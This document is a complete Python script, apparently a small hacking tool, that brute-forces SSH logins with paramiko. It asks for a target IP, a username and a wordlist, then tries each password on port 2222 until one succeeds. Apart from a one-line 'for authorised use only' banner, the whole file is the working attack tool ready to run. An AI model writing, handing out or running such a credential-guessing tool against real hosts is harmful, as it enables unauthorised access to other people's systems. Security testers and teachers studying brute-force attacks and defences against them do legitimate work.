import paramiko
from colorama import Fore, Style, init

init()

def try_password(password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, port=2222, username=username, password=password, timeout=3)
        print(Fore.GREEN + f"[+] Password found: {password}" + Style.RESET_ALL)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(Fore.RED + f"[-] Failed: {password}" + Style.RESET_ALL)
        return False
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)
        return False

def banner():
    print(Fore.CYAN + """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
    """ + Style.RESET_ALL)
    print(Fore.CYAN + "          SSH Brute Forcer  |  For authorised use only\n" + Style.RESET_ALL)

if __name__ == "__main__":
    banner()
    target_ip = input(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Target IP: ").strip()
    wordlist_path = input(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Wordlist path: ").strip()
    username = input(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Username: ").strip()


    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()
            if try_password(password):
                break